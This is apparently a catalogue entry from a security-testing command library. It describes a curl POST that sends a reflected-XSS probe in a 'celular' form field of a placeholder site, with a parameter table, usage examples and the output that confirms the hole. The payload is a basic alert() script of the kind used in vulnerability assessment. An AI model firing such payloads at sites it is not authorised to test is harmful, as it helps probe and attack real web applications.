---
id: cmd-uuid-curl-xss-test-001
data: >-
  curl -X POST https://target-website.com/ -d
  "celular=<script>alert('XSS')</script>" -H "Content-Type:
  application/x-www-form-urlencoded" -v
tags:
  - xss
  - testing
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:44.630Z'
verified: false
validated: true
submitted: true
---
# curl-send-post-xss-test

## Command

```bash
curl -X POST https://target-website.com/ -d "celular=<script>alert('XSS')</script>" -H "Content-Type: application/x-www-form-urlencoded" -v
```

## Description

This command sends a POST request to the target website's homepage with a test XSS payload in the 'celular' parameter to check for reflection without sanitization. Use it during vulnerability assessment to identify reflected XSS issues.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://target-website.com/` | Target URL (replace with actual homepage) | Yes |
| `-d "celular=<script>alert('XSS')</script>"` | Payload data in the 'celular' field | Yes |
| `-H "Content-Type: application/x-www-form-urlencoded"` | Sets the content type for form data | Yes |
| `-v` | Verbose mode to show response details | No |

## Examples

### Basic Usage

```bash
curl -X POST https://example.com/ -d "celular=<script>alert(1)</script>"
```

### Advanced Usage

```bash
curl -X POST https://example.com/ -d "celular=<script>alert('XSS')</script>" -H "Content-Type: application/x-www-form-urlencoded" -v -o response.html
```

## Expected Output

HTTP response (200 OK) with body containing the reflected payload, e.g., HTML snippet showing "<script>alert('XSS')</script>" unescaped. Look for the payload in the output to confirm vulnerability.

## Related

- [[Related Procedure: Test-and-Exploit-Reflected-XSS-in-Celular-Parameter]]
